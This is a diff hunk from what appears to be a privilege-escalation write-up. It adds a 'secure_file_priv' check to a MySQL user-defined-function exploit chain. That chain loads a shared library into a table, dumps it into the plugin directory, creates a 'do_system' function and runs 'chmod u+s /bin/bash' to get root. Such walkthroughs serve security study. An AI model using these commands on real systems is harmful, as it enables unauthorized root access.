@@ -236,6 +236,7 @@ Hence, we are invoking the code “chmod u+s /bin/bash" to set the sticky bit on
 create table shell(line blob);
 insert into shell values(load_file('/tmp/1518.so'));
 show variables like '%plugin%';
+SHOW VARIABLES LIKE "secure_file_priv";
 select * from shell into dumpfile '/usr/lib/mysql/plugin/1518.so';
 create function do_system returns integer soname '1518.so';
 select do_system('chmod u+s /bin/bash');
